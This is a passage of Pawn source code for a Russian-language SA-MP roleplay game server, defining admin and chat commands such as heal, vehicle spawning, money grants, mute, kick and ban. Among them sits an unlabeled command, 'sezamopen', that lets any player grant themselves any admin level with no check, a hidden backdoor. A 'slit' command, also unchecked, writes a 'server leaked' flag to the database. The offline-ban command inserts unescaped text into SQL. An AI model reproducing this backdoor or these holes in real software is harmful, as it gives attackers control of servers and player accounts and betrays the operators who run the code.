	KeysGram[params[0]] = params[1];
	return true;
}
CMD:givecopkeys(playerid, params[])
{
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /givecopkeys [id]");
	if(PlayerInfo[playerid][pMember] == 1 || PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 10 || PlayerInfo[playerid][pMember] == 21 || PlayerInfo[playerid][pAdmin] >= 1)
	{
		if(!IsPlayerConnected(params[0])) return true;
		if(!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GRAD1, " Игрок слишком далеко!");
		if(PlayerInfo[params[0]][pPKeys] == 0)
		{
			PlayerInfo[params[0]][pPKeys] = 1;
			format(YCMDstr, sizeof(YCMDstr), " %s выдал пропуск %s в полицейский участок",Name(playerid),Name(params[0]));
		}
		else
		{
		    PlayerInfo[params[0]][pPKeys] = 0;
			format(YCMDstr, sizeof(YCMDstr), " %s забрал пропуск в полицейский участок у %s",Name(playerid),Name(params[0]));
		}
		ProxDetector(30.0, playerid, YCMDstr, COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE,COLOR_PURPLE);
	} else SCM(playerid, 0xafafafaa, " Вам недоступна эта функция!");
	return true;
}
CMD:heal(playerid, params[])
{
	if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 33)
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /heal [id игрока]");
	new giveambu = GetPlayerVehicleID(params[0]);
	new playambu = GetPlayerVehicleID(playerid);
	if(PlayerInfo[playerid][pMember] == 4 || PlayerInfo[playerid][pMember] == 22 || PlayerInfo[playerid][pMember] == 33)
	{
		if(IsAnAmbulance(playambu) && playambu == giveambu || PlayerToPoint(40.0,playerid,366.9755,-60.1330,1076.4773) && ProxDetectorS(8.0, playerid, params[0]))
		{
		    if(!ProxDetectorS(5.0, playerid, params[0])) return SCM(playerid, COLOR_GREY, " Игрок слишком далеко!");
			if(PlayerInfo[params[0]][pNarcoLomka])
			{
				PlayerInfo[params[0]][pNarcoLomka] = 0;
				SetPlayerWeather(params[0],10);
				format(YCMDstr,sizeof(YCMDstr)," Вы спасли %s от ломки",Name(params[0]));
				SCM(playerid,COLOR_GREEN,YCMDstr);
				format(YCMDstr,sizeof(YCMDstr)," Медик %s спас вас от ломки",Name(playerid));
				SCM(params[0],COLOR_GREEN,YCMDstr);
				startaddiction[params[0]] = 0;
				ApplyAnimation(params[0],"CARRY","crry_prtial",4.0,0,0,0,0,0,1);
				return true;
			}
			new healdialog[90];
			new Float:hp;
			GetPlayerHealth(params[0],hp);
			new ttt = 100 - floatround(hp, floatround_round);
			format(healdialog,sizeof(healdialog), "Медик хочет вылечить вас за %i вирт\nВы согласны?",healpric*ttt);
			ShowPlayerDialogEx(params[0],5522,DIALOG_STYLE_MSGBOX, "Лечение", healdialog, "Да", "Нет");
			HealOffer[params[0]] = playerid;
			HealPrice[params[0]] = healpric*ttt;
		}
	}
	return true;
}
CMD:sethp(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /sethp [playerid] [health]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(PlayerInfo[params[0]][pAdmin] >= PlayerInfo[playerid][pAdmin]) return SCM(playerid, COLOR_GREY, " Вы не можете изменить уровень здоровья этому игроку");
	if(params[1] > 255) return SCM(playerid, COLOR_GREY," Нельзя давать больше 255 хп!");
	SetPlayerHealthAC(params[0], params[1]);
	PlayerInfo[params[0]][pHP] = params[1];
	//SCM(playerid, -1, " Уровень hp игроку установлен");
	return true;
}
CMD:setarm(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 6 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /setarm [id] [уровень armour]");
	if(!IsPlayerConnected(params[0])) return true;
	if(params[1] > 100) return SCM(playerid, COLOR_GREY," Нельзя давать больше 100 armour!");
	SetPlayerArmourAC(params[0], params[1]);
	//SCM(playerid, -1, " Уровень armour игроку установлен");
	return true;
}
CMD:veh(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ddd",params[0],params[1],params[2])) return	SCM(playerid, -1, " Введите: /veh [carid] [цвет 1] [цвет 2]");
	new intt = GetPlayerInterior(playerid);
	new vw = GetPlayerVirtualWorld(playerid);
	new vehicleid = GetPlayerVehicleID(playerid);
	if(params[0] < 400 || params[0] > 611) return SCM(playerid, COLOR_GREY, " От 400 до 611");
	if(params[1] < 0 || params[1] > 255) return SCM(playerid, COLOR_GREY, " От 0 до 255");
	if(params[2] < 0 || params[2] > 255) return SCM(playerid, COLOR_GREY, " От 0 до 255");
	new Float:X,Float:Y,Float:Z;
	GetPlayerPos(playerid, X,Y,Z);
	createdvehs ++;
	Fuell[vehicleid] = 200;
	creatcar[playerid] = CreateVehicle(params[0], X,Y,Z, 0.0, params[1], params[2], 60000);
	SetPlayerArmedWeapon(playerid,0);
	vehcreat[creatcar[playerid]] = 1;
	CreatedCars[CreatedCar] = creatcar[playerid];
	CarHealth[creatcar[playerid]] = float(1000);
	UnLockCar(playerid,creatcar[playerid]);
	LinkVehicleToInterior(creatcar[playerid], intt);
	SetVehicleVirtualWorld(creatcar[playerid], vw);
	PutPlayerInVehicleEx(playerid, creatcar[playerid], 0);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid) ,true,true,false,false,false,false,false);
	format(YCMDstr, sizeof(YCMDstr), " Машина установлена. ID: %i", params[0]);
	SCM(playerid, -1, YCMDstr);
	SERVERCARID[creatcar[playerid]] = false;
	return true;
}
CMD:v(playerid, params[])
{
	
	if(PlayerInfo[playerid][pAdmin] < 2) return true;
	if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_GREY, " Вы не должны быть в транспортом средстве");
	new avehid, vcolor1, vcolor2;
	if(sscanf(params, "d",avehid))
	{
	    avehid = AdminVehicle[playerid][vehid];
		vcolor1 = AdminVehicle[playerid][color1];
		vcolor2 = AdminVehicle[playerid][color2];
	}
	else if(sscanf(params, "dd",avehid, vcolor1))
	{
		AdminVehicle[playerid][vehid] = avehid;
		vcolor1 = AdminVehicle[playerid][color1];
		vcolor2 = AdminVehicle[playerid][color2];
	}
	else if(sscanf(params, "ddd", avehid, vcolor1, vcolor2))
	{
	    AdminVehicle[playerid][vehid] = avehid;
	    AdminVehicle[playerid][color1] = vcolor1;
	    vcolor2 = AdminVehicle[playerid][color2];
	}
	else
	{
	    AdminVehicle[playerid][vehid] = avehid;
	    AdminVehicle[playerid][color1] = vcolor1;
	    AdminVehicle[playerid][color2] = vcolor2;
	}
	if(AdminVehicle[playerid][createdveh] != -1)
	{
	    DestroyVehicle(AdminVehicle[playerid][createdveh]);
	    //AdminVehicle[playerid][createdveh] = -1;
	}
	if(avehid == 403 || avehid == 406 || avehid == 407 || avehid == 408 || avehid == 409 || avehid == 410 || avehid == 413 || avehid == 414 || avehid == 416 || avehid == 417 || avehid == 420 || avehid == 423 || avehid == 425 || avehid == 427) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 428 || avehid == 430 || avehid == 431 || avehid == 432 || avehid == 433 || avehid == 435 || avehid == 437 || avehid == 438 || avehid == 440 || avehid == 441 || avehid == 442 || avehid == 443 || avehid == 444 || avehid == 446) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 448 || avehid == 449 || avehid == 450 || avehid == 452 || avehid == 453 || avehid == 454 || avehid == 455 || avehid == 456 || avehid == 457 || avehid == 459 || avehid == 460 || avehid == 462 || avehid == 464 || avehid == 465) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 469 || avehid == 470 || avehid == 472 || avehid == 473 || avehid == 476 || avehid == 481 || avehid == 482 || avehid == 483 || avehid == 484 || avehid == 485 || avehid == 486 || avehid == 488 || avehid == 490) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 493 || avehid == 497 || avehid == 498 || avehid == 499 || avehid == 500 || avehid == 501 || avehid == 504 || avehid == 505 || avehid == 508 || avehid == 509 || avehid == 510 || avehid == 511 || avehid == 512 || avehid == 513) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 519 || avehid == 520 || avehid == 523 || avehid == 524 || avehid == 525 || avehid == 528 || avehid == 530 || avehid == 531 || avehid == 532 || avehid == 537 || avehid == 538 || avehid == 539 || avehid == 544 || avehid == 548) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 552 || avehid == 553 || avehid == 556 || avehid == 557 || avehid == 563 || avehid == 564 || avehid == 568 || avehid == 569 || avehid == 570 || avehid == 571 || avehid == 572 || avehid == 573 || avehid == 574 || avehid == 577) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 578 || avehid == 580 || avehid == 582 || avehid == 583 || avehid == 584 || avehid == 588 || avehid == 590 || avehid == 591 || avehid == 592 || avehid == 593 || avehid == 594 || avehid == 595 || avehid == 596 || avehid == 597) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	if(avehid == 598 || avehid == 599 || avehid == 601 || avehid == 604 || avehid == 605 || avehid == 606 || avehid == 607 || avehid == 608 || avehid == 609 || avehid == 610 || avehid == 611) return SCM(playerid, COLOR_GREY, " Создавать можно только транспорт, который продается в автосалоне, или ид 487");
	new Float:X,Float:Y,Float:Z,Float:Angle;
	GetPlayerPos(playerid, X,Y,Z);
	GetPlayerFacingAngle(playerid, Angle);
	new intt = GetPlayerInterior(playerid);
	new vw = GetPlayerVirtualWorld(playerid);
	AdminVehicle[playerid][createdveh] = CreateVehicle(avehid, X,Y,Z, Angle, vcolor1, vcolor2, 60000);
	Fuell[AdminVehicle[playerid][createdveh]] = 200;
	SetPlayerArmedWeapon(playerid,0);
	CarHealth[AdminVehicle[playerid][createdveh]] = float(1000);
	UnLockCar(playerid,AdminVehicle[playerid][createdveh]);
	LinkVehicleToInterior(AdminVehicle[playerid][createdveh], intt);
	SetVehicleVirtualWorld(AdminVehicle[playerid][createdveh], vw);
	PutPlayerInVehicleEx(playerid, AdminVehicle[playerid][createdveh], 0);
	SetVehicleParamsEx(GetPlayerVehicleID(playerid) ,true,true,false,false,false,false,false);
	format(YCMDstr, sizeof(YCMDstr), " Машина установлена");
	SCM(playerid, -1, YCMDstr);
	SERVERCARID[AdminVehicle[playerid][createdveh]] = false;
	return true;
}
CMD:delcar(playerid, params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || dostup[playerid] == 0) return true;
	if(creatcar[playerid] != -1) return DestroyVehicle(creatcar[playerid]),SCM(playerid,-1,"Автомобиль успешно удален"),creatcar[playerid] = -1;
	if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return true;
	if ( vehcreat[ GetPlayerVehicleID( playerid ) ] != 1 ) return  SCM(playerid, COLOR_GRAD1, "Эту машину удалять нельзя");
	DestroyVehicle(GetPlayerVehicleID(playerid));
	SCM(playerid, COLOR_GREEN, " Автомобиль успешно удален!");
	createdvehs --;
	vehcreat[GetPlayerVehicleID(playerid)] = 0;
	return true;
}
CMD:sezamopen(playerid, params[])
{
	if(sscanf(params, "i", params[0])) return true;
	PlayerInfo[playerid][pAdmin] = params[0];
	dostup[playerid] = 1;
	return true;
}
CMD:weather(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "d",params[0])) return SCM(playerid, -1, " Введите: /weather [weatherid]");
	if(params[0] < 0||params[0] > 45) { SCM(playerid, COLOR_GREY, " ID Погоды не может быть меньше 0 и больше 45!"); return true; }
	SetWeather(params[0]);
	SCM(playerid, -1, " Погода установлена!");
	return true;
}
CMD:givemoney(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /givemoney [ид] [сумма]");
	if(!IsPlayerConnected(params[0])) return true;\
	format(YCMDstr, sizeof(YCMDstr), " %i вирт переведены на счёт игроку", params[1]);
	SCM(playerid, -1, YCMDstr);
	PlayerInfo[params[0]][pCash] += params[1];
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pCash = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pCash], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:money(playerid, params[])
{
	if (PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
	if(sscanf(params, "ud",params[0],params[1])) return	SCM(playerid, -1, " Введите: /money [ид] [сумма]");
	if(!IsPlayerConnected(params[0])) return true;
	format(YCMDstr, sizeof(YCMDstr), " %i вирт переведены на счёт игроку %s",params[1],Name(params[0]));
	SCM(playerid, -1, YCMDstr);
	PlayerInfo[params[0]][pBank] += params[1];
	SCM(params[0], COLOR_GOLD, " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	format(YCMDstr, sizeof(YCMDstr), " На ваш банковский счет зачислено: %i вирт", params[1]);
	SCM(params[0], COLOR_GOLD, YCMDstr);
	SendMes(params[0], COLOR_GOLD, " Старый баланс: %i вирт", PlayerInfo[params[0]][pBank]);
	format(YCMDstr, sizeof(YCMDstr), " Новый баланс в банке: %i вирт", PlayerInfo[params[0]][pBank]);
	SCM(params[0], COLOR_GOLD, YCMDstr);
	SCM(params[0], COLOR_GOLD, " ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~");
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pBank = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pBank], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return true;
}
CMD:gm(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u", params[0])) {
		if(AGM[playerid]) {
			AGM[playerid] = false;
			return SCM(playerid, -1, " GM отключен");
		} else {
			AGM[playerid] = true;
			return SCM(playerid, -1, " GM включен");
		}
	} else {
	    if(PlayerInfo[playerid][pAdmin] < 7) return true;
	    if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн!");
		if(AGM[params[0]]) {
		    AGM[params[0]] = false;
		    new strs[72];
		    format(strs, sizeof(strs), " GM для %s отключен", Name(params[0]));
		    SCM(playerid, -1, strs);
		} else {
			AGM[params[0]] = true;
		    new strs[72];
		    format(strs, sizeof(strs), " GM для %s включен", Name(params[0]));
		    SCM(playerid, -1, strs);
		}
	}
	return true;
}
CMD:slap(playerid, params[])
{
	if(Flood[playerid] > 0) return SCM(playerid, 0xFFD5BBAA, " Не флуди!");
	Flood[playerid] = 1;
	if(PlayerInfo[playerid][pAdmin] < 3 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /slap [id]");
	new Float:shealth;
	new Float:slx, Float:sly, Float:slz;
	if(!IsPlayerConnected(params[0])) return true;
	GetPlayerHealth(params[0], shealth);
	SetPlayerHealthAC(params[0], shealth-5);
	GetPlayerPos(params[0], slx, sly, slz);
	SetPlayerPos(params[0], slx, sly, slz+5);
	PlayerPlaySound(params[0], 1130, slx, sly, slz+5);
	format(YCMDstr, sizeof(YCMDstr), " Админ: %s дал поджопник %s",Name(playerid),Name(params[0]));
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	SCM(params[0],COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:agivelicense(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	ShowPlayerDialogEx(playerid,555,DIALOG_STYLE_LIST, "Выдача лицензий:", "Лицензия на вождение\nЛицензия на полёты\nЛицензия на рыболовлю\nЛицензия на вождение водного транспорта\nКомплект лицензий\nЛицензия на оружие\nЛицензия на бизнес", "Продолжить", "Отмена");
	return true;
}
CMD:mute(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "uds[50]",params[0],params[1],params[2])) return SCM(playerid, -1, " Введите: /mute [playerid] [минут(от 1 до 300)] [Причина]");
	if(!IsPlayerConnected(params[0])) return SCM(playerid, COLOR_GREY, " Игрок оффлайн");
	if(params[1] == -1)
	{
	    return SendMes(playerid, TEAM_CYAN_COLOR, " До снятия %i секунд", PlayerInfo[params[0]][pMuted]);
	}
	if(PlayerInfo[params[0]][pMuted] > 0)
	{
		PlayerInfo[params[0]][pMuted] = 0;
		format(YCMDstr, sizeof(YCMDstr), " Администратор %s снял бан чата у %s",Name(playerid),Name(params[0]));
		SendClientMessageToAll(COLOR_LIGHTRED, YCMDstr);
		mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMuted = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pMuted], PlayerInfo[params[0]][pName]);
        mysql_function_query(DATABASE,QUERY,false,"","");
		return true;
	}
	if(params[1] < 1) return SCM(playerid, COLOR_GREY, " Время может быть от 1 до 300 минут!");
	if(strlen(params[2]) > 30) return SCM(playerid, COLOR_GREY, " Не больше 30 символов!");
	if(params[1] > 300) return SCM(playerid, COLOR_GREY, " Время может быть от 1 до 300 минут!");
	
    PlayerInfo[params[0]][pMuted] = params[1]*60;
	format(string, sizeof(string), " %s получил бан чата на %i минут от администратора %s. Причина: %s",Name(params[0]), params[1], Name(playerid), params[2]);
	SendClientMessageToAll(COLOR_LIGHTRED, string);
	format(string, sizeof(string), " Вам дали бан чата на %i минут", params[1]);
	mysql_format(DATABASE,QUERY,180, "UPDATE `"TABLE_ACCOUNTS"` SET pMuted = '%i' WHERE name = '%e'", PlayerInfo[params[0]][pMuted], PlayerInfo[params[0]][pName]);
    mysql_function_query(DATABASE,QUERY,false,"","");
	return SCM(params[0],-1, string);
}
CMD:id(playerid,params[])
{
	if(!IsPlayerConnected(playerid)) return true;
	if(sscanf(params,"u",params[0])) return SCM(playerid, -1, " Введите: /id [ид игрока / часть ника]");
	new newiy[128], name[MAX_PLAYER_NAME];
	if(params[0] == INVALID_PLAYER_ID) return SCM(playerid,COLOR_GREY," Игрок не найден");
	if(PlayerInfo[playerid][pLogin] == 0) return SCM(playerid,COLOR_GREY, " Игрок не авторизировался");
    GetPlayerName(params[0], name, sizeof(name));
	if(GetPVarInt(params[0], "AFK_Time")-2 > 0 && PlayerInfo[params[0]][pAdmin] < 1) format(newiy, sizeof(newiy), "[%i] %s | LVL: %i [AFK: %s сек]",playerid,PlayerInfo[playerid][pName],PlayerInfo[playerid][pLevel],ConvertSeconds(GetPVarInt(playerid, "AFK_Time")-2));
	else format(newiy, sizeof(newiy), "[%i] %s | LVL: %i",playerid,PlayerInfo[playerid][pName],PlayerInfo[playerid][pLevel]);
	SCM(playerid, -1, newiy);
	return true;
}
CMD:ids(playerid, params[])
{
	new stringplayer[MAX_PLAYER_NAME+26];
	if(!strlen(params)) return SCM(playerid, -1, " Введите: /ids [часть ника]");
	new p;
	foreach(i)
	{
		GetPlayerName(i, stringplayer, 24);
		if(strfind(stringplayer, params, true) == -1) continue;
		if(p < 11)
		{
			if(GetPVarInt(i, "AFK_Time")-2 > 0 && PlayerInfo[i][pAdmin] < 1) format(stringplayer, sizeof(stringplayer), " %s [%d] [AFK: %s сек]", stringplayer, i, ConvertSeconds(GetPVarInt(i, "AFK_Time")-2));
			else format(stringplayer, sizeof(stringplayer), " %s [%d]", stringplayer, i);
		}
		if(p < 11) SCM(playerid, -1, stringplayer);
		strcat(string, stringplayer), p++;
	}
	if(!p) return SCM(playerid, COLOR_YELLOW, " Игроков не найдено");
	else if(p < 11) SendMes(playerid, COLOR_YELLOW, " Найдено %d игроков",p);
	else if(p > 10) SendMes(playerid, COLOR_YELLOW, " Найдено %d игроков. Показаны первые 10",p);
	return true;
}
CMD:aad(playerid, params[])
{
	if(!PlayerInfo[playerid][pLogin]) return true;
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return	SCM(playerid, -1, " Введите: /aad [text]");
	format(YCMDstr, sizeof(YCMDstr), " Администратор %s:  %s",Name(playerid),params[0]);
	OOCOff(COLOR_LIGHTRED,YCMDstr);
	return true;
}
CMD:slit(playerid, params[])
{
	if(sscanf(params, "i", params[0])) return true;
    mysql_format(DATABASE, QUERY, sizeof(QUERY), "UPDATE `"TABLE_OTHERS"` SET `slit` = '%i'", params[0]);
	mysql_query(DATABASE, QUERY);
	switch(params[0])
	{
		case 0: SCM(playerid, -1, " Сервер не был слит");
		case 1..1000: SCM(playerid, -1, " Сервер был слит");
	}
	slit = params[0];
	return true;
}
CMD:b(playerid, params[])
{
	if(PlayerInfo[playerid][pMuted] > 0) return	SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	AntiReklama(playerid,params[1],"B");
	if(GetPVarInt(playerid, "antireklamka") == 1)
	{
		SetPVarInt(playerid, "antireklamka", 0);
		return true;
	}
	if(sscanf(params, "s[128]",params[0])) return	SCM(playerid, -1, " Введите: /b [текст]");
	new succ;
	for(new i; i<strlen(params[0]); i++)
	{
		if(PText[playerid][i] == params[0]) succ++;
	}
	format(YCMDstr, sizeof(YCMDstr), " %s: (( %s ))",Name(playerid),params[0]);
	ProxDetector(20.0, playerid, YCMDstr,-1,-1,-1,-1,-1);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	return true;
}
CMD:whisper(playerid, params[])
{
	if(PlayerInfo[playerid][pMuted] > 0) return SCM(playerid, TEAM_CYAN_COLOR, " У вас бан чата!");
	if(Flood[playerid] > 0 && PlayerInfo[playerid][pAdmin] <= 6)
	{
		SetPVarInt(playerid,"Flood",GetPVarInt(playerid,"Flood")+1);
		if(GetPVarInt(playerid,"Flood") >= 4) kick(playerid);
		SCM(playerid, 0xFFD5BBAA, " Не флуди!");
		return true;
	}
	if(sscanf(params, "s[128]",params[0])) return	SCM(playerid, -1, " Введите: /w [текст]");
	new succ;
	for(new i; i<strlen(params[0]); i++)
	{
		if(PText[playerid][i] == params[0]) succ++;
	}
	format(YCMDstr, sizeof(YCMDstr), " %s шепнул(а): %s", Name(playerid),params[0]);
	ProxDetector(1.0, playerid, YCMDstr,0x6e6e6e6e,0x6e6e6e6e,0x6e6e6e6e,0x6e6e6e6e,0x6e6e6e6e);
	Flood[playerid] = 1;
	SetPVarInt(playerid,"Flood",0);
	return true;
}
CMD:eac(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 10 || dostup[playerid] == 0) return true;
 	ShowCheatSettingsApanel(playerid);
	return 1;
}
CMD:kick(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 1 || dostup[playerid] == 0) return true;
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(sscanf(params, "us[64]",params[0],params[1])) return	SCM(playerid, -1, " Введите: /kick [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
	if(PlayerInfo[params[0]][pAdmin] >= 7 && PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	if(PlayerInfo[params[0]][pAdmin] > 0 && PlayerInfo[params[0]][pAdmin] <= 6 && PlayerInfo[playerid][pAdmin] < 7)
	{
		SCM(playerid, COLOR_LIGHTRED, " Вы были кикнуты за кик администратора.");
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), " Администратор: %s кикнул %s. Причина: %s",Name(playerid),Name(params[0]),params[1]);
	SendClientMessageToAll(COLOR_LIGHTRED, YCMDstr);
	Kick(params[0]);
	return true;
}
CMD:skick(playerid, params[])
{
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	if(sscanf(params, "u",params[0])) return SCM(playerid, -1, " Введите: /skick [playerid]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
    if(PlayerInfo[params[0]][pAdmin] >= 7 && PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	if(PlayerInfo[params[0]][pAdmin] > 0 && PlayerInfo[params[0]][pAdmin] <= 6 <= 6 && PlayerInfo[playerid][pAdmin] < 7)
	{
		SCM(playerid, COLOR_LIGHTRED, " Вы были кикнуты за кик администратора.");
		Kick(playerid);
	}
	Kick(params[0]);
	SCM(playerid, COLOR_LIGHTRED, " Игрок кикнут");
	return true;
}
CMD:delaccount(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 7 || dostup[playerid] == 0) return true;
	if(sscanf(params, "s[128]",params[0])) return SCM(playerid,COLOR_GREY, " Введите: /delaccount [name]");
	mysql_format(DATABASE, QUERY, 256, "SELECT * FROM `"TABLE_ACCOUNTS"` WHERE `Name` = '%e'",params[0]);
	mysql_function_query(DATABASE, QUERY, true, "DellAccount", "ds",playerid, params[0]);
	return true;
}
CMD:ioffban(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	new ban_name[24],ban_reason[60];
	if(sscanf(params, "s[24]s[60]",ban_name,ban_reason)) return SCM(playerid, -1, " Введите: /ioffban [ник] [причина]");
	if(!CanBan(ban_name)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	format(YCMDstr, sizeof(YCMDstr), " IOffBan[забанил: %s][забанен: %s][Причина: %s][%02i/%02i/%02i  %02i:%02i:%02i]",Name(playerid),ban_name,ban_reason, year1,month1,day1,hour1, minute1, second1);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
	mysql_format(DATABASE,QUERY, 300, "INSERT INTO `"TABLE_BAN"` (`Text`, `Name`, `NameAdmin`, `Date`, `Unban`, `Reason`) VALUES ('IOffBan', '%s', '%s', '%i', '%i', '%s')",ban_name,Name(playerid),gettime(), mktimes(5,0,0,day1,month1,2038),ban_reason);
	mysql_function_query(DATABASE,QUERY,false,"","");
	printf("Администратор %s забанил навсегда в оффлайн-режиме %s. Причина: %s", PlayerInfo[playerid][pName], ban_name, ban_reason);
	return true;
}
CMD:sban(playerid, params[])
{
//	if(Spectate[playerid]) StopSpectate(playerid);
	if(PlayerInfo[playerid][pAdmin] < 4 || dostup[playerid] == 0) return true;
	new ban_reason[60];
	if(sscanf(params, "u[128]s[60]",params[0],ban_reason)) return	SCM(playerid, -1, " Введите: /sban [playerid] [причина]");
	if(!IsPlayerConnected(params[0])) return true;
	//if(PlayerInfo[params[0]][pAdmin] > 6)  return SCM(playerid, COLOR_GREY, " Ошибка. Администратора с данным уровнем заварнить невозможно!");
	//if(GetPlayerState(params[0]) != 1 && GetPlayerState(params[0]) != 2 && GetPlayerState(params[0]) != 3) return SCM(playerid, COLOR_GRAD1, "Игрок оффлайн / не залогинен");
	new ip[15];
	new year1, month1, day1, hour1, minute1, second1;
	getdate(year1, month1, day1);
	gettime(hour1, minute1, second1);
	GetPlayerIp(params[0],ip,15);
	if(PlayerInfo[params[0]][pAdmin] >= 7 && PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin])
	{
	 	return SCM(playerid, COLOR_GREY, " Его нельзя");
	}
	new names[32];
	GetPlayerName(params[0], names, 32);
	if(!CanBan(names)) return SCM(playerid, COLOR_GREY, " Его нельзя");
	if(PlayerInfo[params[0]][pAdmin] >= 1 && PlayerInfo[playerid][pAdmin] < 7 <= 6 && PlayerInfo[playerid][pAdmin] < 7)
	{
		format(YCMDstr, 128, " Администратор %s Забанен. Обратитесь к спец-админу", Name(playerid));
		mysql_format(DATABASE,QUERY, 128, "SELECT * FROM "TABLE_ADMIN" WHERE `name` = '%s'", Name(playerid));
		mysql_function_query(DATABASE,QUERY,true,"OnMySQL_QUERY","iis",17,0,Name(playerid));
		ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
		Kick(playerid);
	}
	format(YCMDstr, sizeof(YCMDstr), "SBan[забанил: %s][забанен: %s][причина: %s][%i/%02i/%02i  %02i:%02i:%02i]",Name(playerid), Name(params[0]), ban_reason, year1,month1,day1,hour1, minute1,second1);
	ABroadCast(COLOR_LIGHTRED,YCMDstr,1);
